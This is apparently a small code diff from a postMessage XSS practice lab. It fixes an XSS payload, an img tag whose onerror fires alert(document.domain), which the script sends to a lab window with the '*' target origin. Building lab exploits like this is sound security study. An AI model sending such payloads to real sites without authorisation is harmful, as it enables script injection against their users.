@@ -11,7 +11,7 @@
         //     console.log(message.data);
         // });
         myWindow = window.open("https://ac13.netlify.app/postmsg_lab");
-        let payload = `<img src=k onerror=alert(document.domain()>`;
+        let payload = `<img src=k onerror=alert(document.domain)>`;
 
         function postMsg() {
             myWindow.postMessage(payload, "*");
